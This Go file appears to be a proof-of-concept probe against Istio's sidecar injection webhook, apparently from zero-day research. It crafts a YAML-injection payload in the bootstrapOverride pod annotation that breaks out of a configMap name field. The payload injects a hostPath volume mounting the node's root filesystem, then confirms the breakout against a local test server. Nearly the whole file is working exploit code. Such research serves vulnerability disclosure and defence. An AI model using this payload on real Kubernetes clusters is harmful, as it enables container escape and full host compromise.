// Probe: sidecar.istio.io/bootstrapOverride (UNVALIDATED) renders UNQUOTED into
// pod.spec.volumes[custom-bootstrap-volume].configMap.name (injection-template.yaml:492).
// Test whether it can break out to POD LEVEL and inject an entire extra volume
// (e.g. a hostPath mount of "/") -- a stronger, pod-scoped structural injection.
//
// Run: go run /home/user/istio/.zeroday/scratch/webhook/repro_probe3.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"

	jsonpatch "github.com/evanphx/json-patch/v5"
	v1beta1 "k8s.io/api/admission/v1beta1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"

	"istio.io/istio/pilot/pkg/model"
	"istio.io/istio/pkg/config/mesh"
	"istio.io/istio/pkg/config/mesh/meshwatcher"
	"istio.io/istio/pkg/kube/inject"
	"istio.io/istio/pkg/kube/multicluster"
)

const scratch = "/home/user/istio/.zeroday/scratch/webhook"

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	cfg, err := os.ReadFile(filepath.Join(scratch, "real-inject-config.yaml"))
	must(err)
	vals, err := os.ReadFile(filepath.Join(scratch, "real-values.yaml"))
	must(err)
	dir, err := os.MkdirTemp("", "reprowh")
	must(err)
	defer os.RemoveAll(dir)
	must(os.WriteFile(filepath.Join(dir, "config"), cfg, 0o644))
	must(os.WriteFile(filepath.Join(dir, "values"), vals, 0o644))
	watcher, err := inject.NewFileWatcher(filepath.Join(dir, "config"), filepath.Join(dir, "values"))
	must(err)
	env := &model.Environment{Watcher: meshwatcher.NewTestWatcher(mesh.DefaultMeshConfig())}
	env.SetPushContext(&model.PushContext{})
	mux := http.NewServeMux()
	_, err = inject.NewWebhook(inject.WebhookParameters{
		Watcher: watcher, Port: 0, Env: env, Mux: mux, MultiCluster: multicluster.NewFakeController(),
	})
	must(err)
	srv := httptest.NewServer(mux)
	defer srv.Close()

	// Break out of `      name: <VALUE>` (6-space configMap.name) up to the 2-space
	// volumes sequence level and inject a full extra volume (hostPath: /).
	payload := "" +
		"custombootstrap\n" +
		"  - name: pwn-hostpath\n" +
		"    hostPath:\n" +
		"      path: /\n" +
		"      type: Directory"

	pod := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name: "victim", Namespace: "default",
			Labels: map[string]string{"sidecar.istio.io/inject": "true"},
			Annotations: map[string]string{
				"sidecar.istio.io/bootstrapOverride": payload,
			},
		},
		Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "app", Image: "nginx"}}},
	}
	raw, _ := json.Marshal(&pod)
	review := v1beta1.AdmissionReview{
		TypeMeta: metav1.TypeMeta{Kind: "AdmissionReview", APIVersion: "admission.k8s.io/v1beta1"},
		Request: &v1beta1.AdmissionRequest{
			Kind: metav1.GroupVersionKind{Version: "v1", Kind: "Pod"},
			Object: runtime.RawExtension{Raw: raw}, Operation: v1beta1.Create, Namespace: "default",
		},
	}
	body, _ := json.Marshal(review)

	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/inject", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	must(err)
	rb, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var out v1beta1.AdmissionReview
	must(json.Unmarshal(rb, &out))
	if out.Response == nil {
		panic("nil response")
	}
	fmt.Printf("Allowed=%v\n", out.Response.Allowed)
	if len(out.Response.Patch) == 0 {
		msg := ""
		if out.Response.Result != nil {
			msg = out.Response.Result.Message
		}
		fmt.Printf("no patch; msg=%q\n", msg)
		return
	}
	p, _ := jsonpatch.DecodePatch(out.Response.Patch)
	orig, _ := json.Marshal(&pod)
	patched, _ := p.Apply(orig)
	var pp corev1.Pod
	must(json.Unmarshal(patched, &pp))
	fmt.Println("---- pod volumes ----")
	hit := false
	for _, v := range pp.Spec.Volumes {
		hp := ""
		if v.HostPath != nil {
			hp = " hostPath.path=" + v.HostPath.Path
			if v.Name == "pwn-hostpath" && v.HostPath.Path == "/" {
				hit = true
			}
		}
		fmt.Printf("volume %q%s\n", v.Name, hp)
	}
	fmt.Println("---- VERDICT ----")
	if hit {
		fmt.Println("CONFIRMED: POD-LEVEL injection -- attacker-defined hostPath(/) volume added via bootstrapOverride annotation")
	} else {
		fmt.Println("Not confirmed (pod-level breakout failed with this payload)")
	}
}
